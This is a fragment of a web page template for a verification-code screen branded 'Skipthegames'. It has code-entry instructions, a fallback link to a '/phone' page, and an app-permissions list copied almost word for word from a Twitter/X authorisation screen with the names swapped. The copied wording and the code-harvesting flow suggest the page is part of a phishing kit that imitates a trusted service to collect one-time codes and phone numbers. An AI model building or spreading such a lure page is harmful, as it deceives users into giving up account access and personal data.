...
<body>
    <nav>
        <div class="logo">
            <img src="images/page2-logo.png" alt="" />
        </div>
        <div class="ancore">
    ...
    <div class="custom-container">
        <div class="box">
            <div class="mini-box">
                <div class="first-look">
                    ...
                    <div class="submit-opstion">
                        ...
                        <p style="margin-top: 10px;">
                            The code you received is good for 30 minutes It may
                            take the code up to 10 minutes or so to arrive <br
                            /> Make sure to check your Spam/Junk/Trash folder
                        </p>

                        <p>
                            if you don't get the code <a
                                href={"/phone?t=" + timestamp}>click here</a
                            >
                        </p>
                    </div>
                </div>
            ...
            <div class="unorder-list">
                <ul>
                    <li>
                        See Skipthegames from your timeline (including protected
                        Text) as well as your Lists and collections.
                    </li>
                    <li>
                        See your skipthegames profile information and account
                        settings. See accounts you follow, mute, and block.
                    </li>
                    <li>Follow and unfollow accounts for you</li>
                    <li>Update your profile and account settings.</li>
                    <li>
                        Post and delete Text for you, and engage with Text
                        posted by others (Like, un-Like, or reply to a Text,
                        Retext, etc.) for you.
                    </li>
        ...
        <div class="custom-containerr">
            <div class="footer-text">
                <p class="big-text">
                    ...
                    understand how it will use data from your skipthegames
                    account. You can revoke access to any app at any time from
                    the <span>Apps and sessions</span> section of your skipthegames
                    account settings.
                </p>
            </div>
        </div>
